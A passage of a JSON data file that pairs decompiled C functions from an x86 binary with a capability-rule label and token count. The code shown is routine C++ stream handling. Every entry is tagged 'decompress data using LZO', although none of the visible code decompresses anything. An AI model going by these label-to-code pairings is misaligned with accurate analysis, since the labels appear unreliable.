0x47f632;\n    piStack84 = uStack100;\n    fcn.0041b360();\n    uStack156 = 0;\n    uStack164 = 0x47cb0e;\n    piStack160 = extraout_ECX_06;\n    iStack92 = unaff_EDI;\n    puStack88 = &stack0xfffffffc;\n    fcn.0047e5b0();\n    if (cStack117 == '\\0') {\n        return extraout_ECX_06;\n    }\n    uStack116 = 0;\n    iStack180 = *(*extraout_ECX_06 + -0xc) + extraout_ECX_06;\n    if (*(iStack180 + 0x84) != NULL) {\n        piStack168 = *(iStack180 + 0x78);\n        uStack144 = uStack80;\n        puStack148 = &stack0xffffff8c;\n        piStack160 = NULL;\n        uStack156 = 0xffff;\n        uStack164 = 0xffff;\n        puStack172 = 0x47cb66;\n        iStack152 = iStack180;\n        (**(**(iStack180 + 0x84) + 0x14))();\ncode_r0x0047cb69:\n        if (uStack116 == 0) {\n            return extraout_ECX_06;\n        }\n        piStack168 = uStack116 | *(extraout_ECX_06 + *(*extraout_ECX_06 + -0xc) + 0x14);\n        puStack172 = 0x47cb92;\n        fcn.0049ce20();\n        return extraout_ECX_06;\n    }\n    puStack172 = 0x47cba6;\n    uVar10 = fcn.0049e780();\n    piStack168 = uVar10;\n    if (uVar10 >> 0x20 == 1) {\n        puStack172 = 0x47cbd0;\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_06 + -0xc);\n        puVar1 = extraout_ECX_06 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_06 + iVar9 + 0x10) & 1) == 0) {\n            puStack172 = 0x47cbe4;\n            fcn.004a3b60();\n        }\n        puStack172 = 0x47cbe9;\n        piVar5 = fcn.004a3b60();\n    }\n    else {\n        puStack172 = 0x47cbb3;\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_06 + -0xc);\n        puVar1 = extraout_ECX_06 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_06 + iVar9 + 0x10) & 1) == 0) {\n            puStack172 = 0x47cbc9;\n            fcn.004a3840();\n            goto code_r0x0047cb69;\n        }\n        puStack172 = 0x47cbf2;\n        fcn.004a3b60();\n        piVar5 = extraout_ECX_06;\n    }\n    puStack172 = 0x47cbf7;\n    fcn.004a3840();\n    puStack172 = 0x47cbff;\n    piStack168 = piVar5;\n    uStack184 = fcn.0041b360();\n    puStack172 = 0x47cc06;\n    fcn.004a3840();\n    puStack172 = 0x47cc0e;\n    piStack168 = uStack184;\n    fcn.0041b360();\n    uStack240 = 0;\n    uStack248 = 0x47cc2e;\n    piStack244 = extraout_ECX;\n    iStack176 = unaff_EDI;\n    puStack172 = &stack0xffffffa8;\n    fcn.0047e5b0();\n    if (cStack201 == '\\0') {\n        return extraout_ECX;\n    }\n    uStack200 = 0;\n    iStack264 = *(*extraout_ECX + -0xc) + extraout_ECX;\n    if (*(iStack264 + 0x84) != NULL) {\n        piStack252 = *(iStack264 + 0x78);\n        uStack228 = uStack164;\n        puStack232 = &stack0xffffff38;\n        piStack244 = NULL;\n        uStack240 = 0xffff;\n        uStack248 = 0xffff;\n        puStack256 = 0x47cc86;\n        iStack236 = iStack264;\n        (**(**(iStack264 + 0x84) + 0xc))();\ncode_r0x0047cc89:\n        if (uStack200 == 0) {\n            return extraout_ECX;\n        }\n        piStack252 = uStack200 | *(extraout_ECX + *(*extraout_ECX + -0xc) + 0x14);\n        puStack256 = 0x47ccb2;\n        fcn.0049ce20();\n        return extraout_ECX;\n    }\n    puStack256 = 0x47ccc6;\n    uVar10 = fcn.0049e780();\n    piStack252 = uVar10;\n    if (uVar10 >> 0x20 == 1) {\n        puStack256 = 0x47ccf0;\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX + -0xc);\n        puVar1 = extraout_ECX + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX + iVar9 + 0x10) & 1) == 0) {\n            puStack256 = 0x47cd04;\n            fcn.004a3b60();\n        }\n        puStack256 = 0x47cd09;\n        piVar5 = fcn.004a3b60();\n    }\n    else {\n        puStack256 = 0x47ccd3;\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX + -0xc);\n        puVar1 = extraout_ECX + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX + iVar9 + 0x10) & 1) == 0) {\n            puStack256 = 0x47cce9;\n            fcn.004a3840();\n            goto code_r0x0047cc89;\n        }\n        puStack256 = 0x47cd12;\n        fcn.004a3b60();\n        piVar5 = extraout_ECX;\n    }\n    puStack256 = 0x47cd17;\n    fcn.004a3840();\n    puStack256 = 0x47cd1f;\n    piStack252 = piVar5;\n    uStack268 = fcn.0041b360();\n    puStack256 = 0x47cd26;\n    fcn.004a3840();\n    puStack256 = 0x47cd2e;\n    piStack252 = uStack268;\n    fcn.0041b360();\n    uStack324 = 0;\n    uStack332 = 0x47cd4e;\n    piStack328 = extraout_ECX_00;\n    iStack260 = unaff_EDI;\n    puStack256 = &stack0xffffff54;\n    fcn.0047e5b0();\n    if (cStack285 == '\\0') {\n        return extraout_ECX_00;\n    }\n    uStack284 = 0;\n    iStack348 = *(*extraout_ECX_00 + -0xc) + extraout_ECX_00;\n    if (*(iStack348 + 0x84) != NULL) {\n        piStack336 = *(iStack348 + 0x78);\n        uStack312 = uStack248;\n        puStack316 = &stack0xfffffee4;\n        piStack328 = NULL;\n        uStack324 = 0xffff;\n        uStack332 = 0xffff;\n        puStack340 = 0x47cda6;\n        iStack320 = iStack348;\n        (**(**(iStack348 + 0x84) + 0x18))();\ncode_r0x0047cda9:\n        if (uStack284 == 0) {\n            return extraout_ECX_00;\n        }\n        piStack336 = uStack284 | *(extraout_ECX_00 + *(*extraout_ECX_00 + -0xc) + 0x14);\n        puStack340 = 0x47cdd2;\n        fcn.0049ce20();\n        return extraout_ECX_00;\n    }\n    puStack340 = 0x47cde6;\n    uVar10 = fcn.0049e780();\n    piStack336 = uVar10;\n    if (uVar10 >> 0x20 == 1) {\n        puStack340 = 0x47ce10;\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_00 + -0xc);\n        puVar1 = extraout_ECX_00 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_00 + iVar9 + 0x10) & 1) == 0) {\n            puStack340 = 0x47ce24;\n            fcn.004a3b60();\n        }\n        puStack340 = 0x47ce29;\n        piVar5 = fcn.004a3b60();\n    }\n    else {\n        puStack340 = 0x47cdf3;\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_00 + -0xc);\n        puVar1 = extraout_ECX_00 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_00 + iVar9 + 0x10) & 1) == 0) {\n            puStack340 = 0x47ce09;\n            fcn.004a3840();\n            goto code_r0x0047cda9;\n        }\n        puStack340 = 0x47ce32;\n        fcn.004a3b60();\n        piVar5 = extraout_ECX_00;\n    }\n    puStack340 = 0x47ce37;\n    fcn.004a3840();\n    puStack340 = 0x47ce3f;\n    piStack336 = piVar5;\n    uStack352 = fcn.0041b360();\n    puStack340 = 0x47ce46;\n    fcn.004a3840();\n    puStack340 = 0x47ce4e;\n    piStack336 = uStack352;\n    fcn.0041b360();\n    uStack408 = 0;\n    uStack416 = 0x47ce6e;\n    piStack412 = extraout_ECX_01;\n    iStack344 = unaff_EDI;\n    puStack340 = &stack0xffffff00;\n    fcn.0047e5b0();\n    if (cStack369 == '\\0') {\n        return extraout_ECX_01;\n    }\n    uStack368 = 0;\n    iStack432 = *(*extraout_ECX_01 + -0xc) + extraout_ECX_01;\n    if (*(iStack432 + 0x84) != NULL) {\n        piStack420 = *(iStack432 + 0x78);\n        uStack396 = uStack332;\n        puStack400 = &stack0xfffffe90;\n        piStack412 = NULL;\n        uStack408 = 0xffff;\n        uStack416 = 0xffff;\n        puStack424 = 0x47cec6;\n        iStack404 = iStack432;\n        (**(**(iStack432 + 0x84) + 0x10))();\ncode_r0x0047cec9:\n        if (uStack368 == 0) {\n            return extraout_ECX_01;\n        }\n        piStack420 = uStack368 | *(extraout_ECX_01 + *(*extraout_ECX_01 + -0xc) + 0x14);\n        puStack424 = 0x47cef2;\n        fcn.0049ce20();\n        return extraout_ECX_01;\n    }\n    puStack424 = 0x47cf06;\n    uVar10 = fcn.0049e780();\n    piStack420 = uVar10;\n    if (uVar10 >> 0x20 == 1) {\n        puStack424 = 0x47cf30;\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_01 + -0xc);\n        puVar1 = extraout_ECX_01 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_01 + iVar9 + 0x10) & 1) == 0) {\n            puStack424 = 0x47cf44;\n            fcn.004a3b60();\n        }\n        puStack424 = 0x47cf49;\n        piVar5 = fcn.004a3b60();\n    }\n    else {\n        puStack424 = 0x47cf13;\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_01 + -0xc);\n        puVar1 = extraout_ECX_01 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_01 + iVar9 + 0x10) & 1) == 0) {\n            puStack424 = 0x47cf29;\n            fcn.004a3840();\n            goto code_r0x0047cec9;\n        }\n        puStack424 = 0x47cf52;\n        fcn.004a3b60();\n        piVar5 = extraout_ECX_01;\n    }\n    puStack424 = 0x47cf57;\n    fcn.004a3840();\n    puStack424 = 0x47cf5f;\n    piStack420 = piVar5;\n    uStack436 = fcn.0041b360();\n    puStack424 = 0x47cf66;\n    fcn.004a3840();\n    puStack424 = 0x47cf6e;\n    piStack420 = uStack436;\n    fcn.0041b360();\n    uStack492 = 0;\n    uStack500 = 0x47cf8e;\n    piStack496 = extraout_ECX_02;\n    iStack428 = unaff_EDI;\n    puStack424 = &stack0xfffffeac;\n    fcn.0047e5b0();\n    if (cStack453 == '\\0') {\n        return extraout_ECX_02;\n    }\n    uStack452 = 0;\n    iStack516 = *(*extraout_ECX_02 + -0xc) + extraout_ECX_02;\n    if (*(iStack516 + 0x84) != NULL) {\n        piStack504 = *(iStack516 + 0x78);\n        uStack480 = uStack416;\n        puStack484 = &stack0xfffffe3c;\n        piStack496 = NULL;\n        uStack492 = 0xffff;\n        uStack500 = 0xffff;\n        puStack508 = 0x47cfe6;\n        iStack488 = iStack516;\n        (**(**(iStack516 + 0x84) + 0x1c))();\ncode_r0x0047cfe9:\n        if (uStack452 == 0) {\n            return extraout_ECX_02;\n        }\n        piStack504 = uStack452 | *(extraout_ECX_02 + *(*extraout_ECX_02 + -0xc) + 0x14);\n        puStack508 = 0x47d012;\n        fcn.0049ce20();\n        return extraout_ECX_02;\n    }\n    puStack508 = 0x47d026;\n    uVar10 = fcn.0049e780();\n    piStack504 = uVar10;\n    if (uVar10 >> 0x20 == 1) {\n        puStack508 = 0x47d050;\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_02 + -0xc);\n        puVar1 = extraout_ECX_02 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_02 + iVar9 + 0x10) & 1) == 0) {\n            puStack508 = 0x47d064;\n            fcn.004a3b60();\n        }\n        puStack508 = 0x47d069;\n        piVar5 = fcn.004a3b60();\n    }\n    else {\n        puStack508 = 0x47d033;\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_02 + -0xc);\n        puVar1 = extraout_ECX_02 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_02 + iVar9 + 0x10) & 1) == 0) {\n            puStack508 = 0x47d049;\n            fcn.004a3840();\n            goto code_r0x0047cfe9;\n        }\n        puStack508 = 0x47d072;\n        fcn.004a3b60();\n        piVar5 = extraout_ECX_02;\n    }\n    puStack508 = 0x47d077;\n    fcn.004a3840();\n    puStack508 = 0x47d07f;\n    piStack504 = piVar5;\n    uStack520 = fcn.0041b360();\n    puStack508 = 0x47d086;\n    fcn.004a3840();\n    puStack508 = 0x47d08e;\n    piStack504 = uStack520;\n    fcn.0041b360();\n    uVar11 = 0x47d0ae;\n    iStack512 = unaff_EDI;\n    puStack508 = &stack0xfffffe58;\n    fcn.0047e5b0(extraout_ECX_03, 0);\n    if (cStack537 == '\\0') {\n        return extraout_ECX_03;\n    }\n    uStack536 = 0;\n    iVar9 = *(*extraout_ECX_03 + -0xc) + extraout_ECX_03;\n    if (*(iVar9 + 0x84) != NULL) {\n        (**(**(iVar9 + 0x84) + 0x20))(*(iVar9 + 0x78), 0xffff, 0, 0xffff, iVar9, &stack0xfffffde8, uStack500);\ncode_r0x0047d109:\n        if (uStack536 == 0) {\n            return extraout_ECX_03;\n        }\n        fcn.0049ce20(uStack536 | *(extraout_ECX_03 + *(*extraout_ECX_03 + -0xc) + 0x14));\n        return extraout_ECX_03;\n    }\n    uVar10 = fcn.0049e780();\n    if (uVar10 >> 0x20 == 1) {\n        fcn.004a36d0(uVar10);\n        iVar9 = *(*extraout_ECX_03 + -0xc);\n        puVar1 = extraout_ECX_03 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_03 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3b60();\n        }\n        piVar5 = fcn.004a3b60();\n    }\n    else {\n        fcn.004a36d0(uVar10);\n        iVar9 = *(*extraout_ECX_03 + -0xc);\n        puVar1 = extraout_ECX_03 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_03 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004a3840();\n            goto code_r0x0047d109;\n        }\n        fcn.004a3b60();\n        piVar5 = extraout_ECX_03;\n    }\n    fcn.004a3840();\n    uVar4 = fcn.0041b360(piVar5);\n    fcn.004a3840();\n    fcn.0041b360(uVar4);\n    piVar5 = *(extraout_ECX_04 + *(*extraout_ECX_04 + -0xc) + 0x7c);\n    if (piVar5 != NULL) {\n        uVar2 = (**(*piVar5 + 0x28))(10);\n        piVar5 = fcn.0047d200(uVar4, uVar11, uVar2);\n        return piVar5;\n    }\n    fcn.0049e780();\n    extraout_ECX_05[1] = 0;\n    fcn.0047e5b0(extraout_ECX_05, 1);\n    if (cStack653 == '\\0') {\n        iVar8 = extraout_ECX_05[1];\n    }\n    else {\n        piVar5 = *(extraout_ECX_05 + *(*extraout_ECX_05 + -0xc) + 0x78);\n        piVar6 = piVar5[2];\n        if (piVar6 <= piVar5[3] && piVar5[3] != piVar6) goto code_r0x0047d2c7;\ncode_r0x0047d271:\n        iVar3 = (**(*piVar5 + 0x24))();\n        iVar8 = extraout_ECX_05[1];\n        iVar9 = iVar8 + 1;\n        piVar6 = in_stack_fffffd9c;\n        if (iVar9 < in_stack_fffffd98) {\n            do {\n                if (iVar3 == -1) {\n                    uVar7 = 2;\ncode_r0x0047d3b2:\n                    if (0 < in_stack_fffffd98) {\n                        *piVar6 = 0;\n                    }\n                    if (iVar8 == 0) {\ncode_r0x0047d32d:\n                        uVar7 = uVar7 | 4;\n                    }\n                    else if (uVar7 == 0) {\n                        return extraout_ECX_05;\n                    }\n                    goto code_r0x0047d385;\n                }\n                if (iVar3 == iStack604) {\n                    uVar7 = 0;\n                    goto code_r0x0047d3b2;\n                }\n                in_stack_fffffd9c = piVar6 + 1;\n                *piVar6 = iVar3;\n                extraout_ECX_05[1] = iVar9;\n                piVar6 = piVar5[2];\n                if (piVar6 < piVar5[3]) {\n                    iVar3 = *piVar6;\n                    piVar5[2] = piVar6 + 1;\n                    if (iVar3 != -1) goto code_r0x0047d2bf;\ncode_r0x0047d310:\n                    iVar9 = extraout_ECX_05[1];\n                    if (in_stack_fffffd98 < 1) {\n                        if (iVar9 != 0) goto code_r0x0047d2a3;\n                        uVar7 = 6;\n                    }\n                    else {\n                        *in_stack_fffffd9c = 0;\n                        uVar7 = 2;\n                        if (iVar9 == 0) goto code_r0x0047d32d;\n                    }\n                    goto code_r0x0047d385;\n                }\n                iVar3 = (**(*piVar5 + 0x28))();\n                if (iVar3 == -1) goto code_r0x0047d310;\ncode_r0x0047d2bf:\n                piVar6 = piVar5[2];\n                if (piVar5[3] <= piVar6) goto code_r0x0047d271;\ncode_r0x0047d2c7:\n                iVar8 = extraout_ECX_05[1];\n                iVar3 = *piVar6;\n                iVar9 = iVar8 + 1;\n                piVar6 = in_stack_fffffd9c;\n                if (in_stack_fffffd98 <= iVar9) break;\n            } while( true );\n        }\n        if (iVar3 == -1) {\n            if (0 < in_stack_fffffd98) {\n                *in_stack_fffffd9c = 0;\n            }\n            uVar7 = 6;\n            if (iVar8 != 0) {\ncode_r0x0047d2a3:\n                uVar7 = 2;\n            }\n            goto code_r0x0047d385;\n        }\n    }\n    if (0 < in_stack_fffffd98) {\n        *in_stack_fffffd9c = 0;\n    }\n    if (iVar8 != 0) {\n        return extraout_ECX_05;\n    }\n    uVar7 = 4;\ncode_r0x0047d385:\n    fcn.0049ce20(uVar7 | *(extraout_ECX_05 + *(*extraout_ECX_05 + -0xc) + 0x14));\n    return extraout_ECX_05;\n}\n",
        "token_count": 7400
    },
    "0047f670": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Removing unreachable block (ram,0x0047d000)\n// WARNING: Removing unreachable block (ram,0x0047cee0)\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.0047f670(ushort *arg_8h)\n\n{\n    uint32_t *puVar1;\n    bool bVar2;\n    ushort uVar3;\n    int16_t iVar4;\n    uint uVar5;\n    int32_t *piVar6;\n    int16_t *piVar7;\n    uint32_t uVar8;\n    int32_t *extraout_ECX;\n    int32_t *extraout_ECX_00;\n    int32_t *extraout_ECX_01;\n    int32_t *extraout_ECX_02;\n    int32_t iVar9;\n    int32_t *in_ECX;\n    int32_t *extraout_ECX_03;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    int32_t extraout_EDX_01;\n    int32_t iVar10;\n    ulong uVar11;\n    char cStack401;\n    int32_t in_stack_fffffe94;\n    int16_t *in_stack_fffffe98;\n    int16_t iStack352;\n    uint uVar12;\n    char cStack285;\n    uint32_t auStack284 [4];\n    uint uStack268;\n    int32_t iStack264;\n    char cStack201;\n    char cStack117;\n    uint var_21h;\n    int32_t var_1ch;\n    uint var_ch;\n    \n    fcn.0047e5b0();\n    if (var_21h == '\\0') {\n        return in_ECX;\n    }\n    bVar2 = false;\n    piVar6 = *(in_ECX + *(*in_ECX + -0xc) + 0x84);\n    if (piVar6 != NULL) {\n        (**(*piVar6 + 0xc))();\n        if (var_1ch < -0x8000) {\n            bVar2 = true;\n            *arg_8h = 0x8000;\n        }\n        else {\n            if (0x7fff < var_1ch) {\n                *arg_8h = 0x7fff;\n                goto code_r0x0047f73d;\n            }\n            *arg_8h = var_1ch;\n        }\ncode_r0x0047f70c:\n        if (!bVar2) {\n            return in_ECX;\n        }\ncode_r0x0047f73d:\n        fcn.0049ce20();\n        return in_ECX;\n    }\n    fcn.0049e780();\n    if (extraout_EDX_01 == 1) {\n        fcn.004a36d0();\n        iVar10 = *(*in_ECX + -0xc);\n        puVar1 = in_ECX + iVar10 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(in_ECX + iVar10 + 0x10) & 1) == 0) {\n            fcn.004a3b60();\n        }\n        fcn.004a3b60();\n    }\n    else {\n        fcn.004a36d0();\n        iVar10 = *(*in_ECX + -0xc);\n        puVar1 = in_ECX + iVar10 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(in_ECX + iVar10 + 0x10) & 1) == 0) {\n            fcn.004a3840();\n            goto code_r0x0047f70c;\n        }\n        fcn.004a3b60();\n    }\n    fcn.004a3840();\n    fcn.0041b360();\n    fcn.004a3840();\n    fcn.0041b360();\n    fcn.0047e5b0();\n    if (cStack117 == '\\0') {\n        return extraout_ECX_03;\n    }\n    piVar6 = *(extraout_ECX_03 + *(*extraout_ECX_03 + -0xc) + 0x84);\n    if (piVar6 != NULL) {\n        (**(*piVar6 + 0x10))();\n        return extraout_ECX_03;\n    }\n    fcn.0049e780();\n    if (extraout_EDX == 1) {\n        fcn.004a36d0();\n        iVar10 = *(*extraout_ECX_03 + -0xc);\n        puVar1 = extraout_ECX_03 + iVar10 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_03 + iVar10 + 0x10) & 1) == 0) {\n            fcn.004a3b60();\n        }\n        fcn.004a3b60();\n    }\n    else {\n        fcn.004a36d0();\n        iVar10 = *(*extraout_ECX_03 + -0xc);\n        puVar1 = extraout_ECX_03 + iVar10 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_03 + iVar10 + 0x10) & 1) == 0) {\n            fcn.004a3840();\n            return extraout_ECX_03;\n        }\n        fcn.004a3b60();\n    }\n    fcn.004a3840();\n    fcn.0041b360();\n    fcn.004a3840();\n    fcn.0041b360();\n    fcn.0047e5b0();\n    if (cStack201 == '\\0') {\n        return extraout_ECX;\n    }\n    iStack264 = *(*extraout_ECX + -0xc) + extraout_ECX;\n    if (*(iStack264 + 0x84) != NULL) {\n        (**(**(iStack264 + 0x84) + 0x1c))();\n        return extraout_ECX;\n    }\n    fcn.0049e780();\n    if (extraout_EDX_00 == 1) {\n        fcn.004a36d0();\n        iVar10 = *(*extraout_ECX + -0xc);\n        puVar1 = extraout_ECX + iVar10 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX + iVar10 + 0x10) & 1) == 0) {\n            fcn.004a3b60();\n        }\n        fcn.004a3b60();\n    }\n    else {\n        fcn.004a36d0();\n        iVar10 = *(*extraout_ECX + -0xc);\n        puVar1 = extraout_ECX + iVar10 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX + iVar10 + 0x10) & 1) == 0) {\n            fcn.004a3840();\n            return extraout_ECX;\n        }\n        fcn.004a3b60();\n    }\n    fcn.004a3840();\n    uStack268 = fcn.0041b360();\n    fcn.004a3840();\n    fcn.0041b360();\n    uVar12 = 0x47d0ae;\n    fcn.0047e5b0(extraout_ECX_00, 0);\n    if (cStack285 == '\\0') {\n        return extraout_ECX_00;\n    }\n    auStack284[0] = 0;\n    iVar10 = *(*extraout_ECX_00 + -0xc) + extraout_ECX_00;\n    if (*(iVar10 + 0x84) != NULL) {\n        (**(**(iVar10 + 0x84) + 0x20))(*(iVar10 + 0x78), 0xffff, 0, 0xffff, iVar10, auStack284, 0x47cf8e);\ncode_r0x0047d109:\n        if (auStack284[0] == 0) {\n            return extraout_ECX_00;\n        }\n        fcn.0049ce20(auStack284[0] | *(extraout_ECX_00 + *(*extraout_ECX_00 + -0xc) + 0x14));\n        return extraout_ECX_00;\n    }\n    uVar11 = fcn.0049e780();\n    if (uVar11 >> 0x20 == 1) {\n        fcn.004a36d0(uVar11);\n        iVar10 = *(*extraout_ECX_00 + -0xc);\n        puVar1 = extraout_ECX_00 + iVar10 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_00 + iVar10 + 0x10) & 1) == 0) {\n            fcn.004a3b60();\n        }\n        piVar6 = fcn.004a3b60();\n    }\n    else {\n        fcn.004a36d0(uVar11);\n        iVar10 = *(*extraout_ECX_00 + -0xc);\n        puVar1 = extraout_ECX_00 + iVar10 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_00 + iVar10 + 0x10) & 1) == 0) {\n            fcn.004a3840();\n            goto code_r0x0047d109;\n        }\n        fcn.004a3b60();\n        piVar6 = extraout_ECX_00;\n    }\n    fcn.004a3840();\n    uVar5 = fcn.0041b360(piVar6);\n    fcn.004a3840();\n    fcn.0041b360(uVar5);\n    piVar6 = *(extraout_ECX_01 + *(*extraout_ECX_01 + -0xc) + 0x7c);\n    if (piVar6 != NULL) {\n        uVar3 = (**(*piVar6 + 0x28))(10);\n        piVar6 = fcn.0047d200(uVar5, uVar12, uVar3);\n        return piVar6;\n    }\n    fcn.0049e780();\n    extraout_ECX_02[1] = 0;\n    fcn.0047e5b0(extraout_ECX_02, 1);\n    if (cStack401 == '\\0') {\n        iVar9 = extraout_ECX_02[1];\n    }\n    else {\n        piVar6 = *(extraout_ECX_02 + *(*extraout_ECX_02 + -0xc) + 0x78);\n        piVar7 = piVar6[2];\n        if (piVar7 <= piVar6[3] && piVar6[3] != piVar7) goto code_r0x0047d2c7;\ncode_r0x0047d271:\n        iVar4 = (**(*piVar6 + 0x24))();\n        iVar9 = extraout_ECX_02[1];\n        iVar10 = iVar9 + 1;\n        piVar7 = in_stack_fffffe98;\n        if (iVar10 < in_stack_fffffe94) {\n            do {\n                if (iVar4 == -1) {\n                    uVar8 = 2;\ncode_r0x0047d3b2:\n                    if (0 < in_stack_fffffe94) {\n                        *piVar7 = 0;\n                    }\n                    if (iVar9 == 0) {\ncode_r0x0047d32d:\n                        uVar8 = uVar8 | 4;\n                    }\n                    else if (uVar8 == 0) {\n                        return extraout_ECX_02;\n                    }\n                    goto code_r0x0047d385;\n                }\n                if (iVar4 == iStack352) {\n                    uVar8 = 0;\n                    goto code_r0x0047d3b2;\n                }\n                in_stack_fffffe98 = piVar7 + 1;\n                *piVar7 = iVar4;\n                extraout_ECX_02[1] = iVar10;\n                piVar7 = piVar6[2];\n                if (piVar6[3] <= piVar7) {\n                    iVar4 = (**(*piVar6 + 0x28))();\n                    if (iVar4 != -1) goto code_r0x0047d2bf;\ncode_r0x0047d310:\n                    iVar10 = extraout_ECX_02[1];\n                    if (in_stack_fffffe94 < 1) {\n                        if (iVar10 != 0) goto code_r0x0047d2a3;\n                        uVar8 = 6;\n                    }\n                    else {\n                        *in_stack_fffffe98 = 0;\n                        uVar8 = 2;\n                        if (iVar10 == 0) goto code_r0x0047d32d;\n                    }\n                    goto code_r0x0047d385;\n                }\n                iVar4 = *piVar7;\n                piVar6[2] = piVar7 + 1;\n                if (iVar4 == -1) goto code_r0x0047d310;\ncode_r0x0047d2bf:\n                piVar7 = piVar6[2];\n                if (piVar6[3] <= piVar7) goto code_r0x0047d271;\ncode_r0x0047d2c7:\n                iVar9 = extraout_ECX_02[1];\n                iVar4 = *piVar7;\n                iVar10 = iVar9 + 1;\n                piVar7 = in_stack_fffffe98;\n                if (in_stack_fffffe94 <= iVar10) break;\n            } while( true );\n        }\n        if (iVar4 == -1) {\n            if (0 < in_stack_fffffe94) {\n                *in_stack_fffffe98 = 0;\n            }\n            uVar8 = 6;\n            if (iVar9 != 0) {\ncode_r0x0047d2a3:\n                uVar8 = 2;\n            }\n            goto code_r0x0047d385;\n        }\n    }\n    if (0 < in_stack_fffffe94) {\n        *in_stack_fffffe98 = 0;\n    }\n    if (iVar9 != 0) {\n        return extraout_ECX_02;\n    }\n    uVar8 = 4;\ncode_r0x0047d385:\n    fcn.0049ce20(uVar8 | *(extraout_ECX_02 + *(*extraout_ECX_02 + -0xc) + 0x14));\n    return extraout_ECX_02;\n}\n",
        "token_count": 3299
    },
    "0047f810": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0047f810(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    int16_t *piVar2;\n    char cVar3;\n    int32_t iVar4;\n    int32_t *in_ECX;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    \n    fcn.0047fec0();\n    if (var_20h != '\\0') {\n        piVar1 = *(in_ECX + *(*in_ECX + -0xc) + 0x78);\n        piVar2 = piVar1[5];\n        if (piVar2 < piVar1[6]) {\n            *piVar2 = arg_8h;\n            piVar1[5] = piVar2 + 1;\n        }\n        else {\n            arg_8h._0_2_ = (**(*piVar1 + 0x34))(arg_8h);\n        }\n        if (arg_8h == -1) {\n            fcn.0049ce20(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 1);\n        }\n    }\n    iVar4 = *(*var_1ch + -0xc);\n    if ((*(var_1ch + iVar4 + 0xd) & 0x20) != 0) {\n        cVar3 = fcn.0049e8f0();\n        if ((cVar3 == '\\0') && (piVar1 = *(var_1ch + iVar4 + 0x78),  piVar1 != NULL)) {\n            iVar4 = (**(*piVar1 + 0x18))();\n            if (iVar4 == -1) {\n                fcn.0049ce20(*(var_1ch + *(*var_1ch + -0xc) + 0x14) | 1);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 448
    },
    "0047f9e0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.0047f9e0(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    piVar1 = *(param_1 + *(*param_1 + -0xc) + 0x78);\n    if (piVar1 != NULL) {\n        iVar2 = (**(*piVar1 + 0x18))();\n        if (iVar2 == -1) {\n            fcn.0049ce20(*(param_1 + *(*param_1 + -0xc) + 0x14) | 1);\n            return param_1;\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 152
    },
    "0047fa90": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
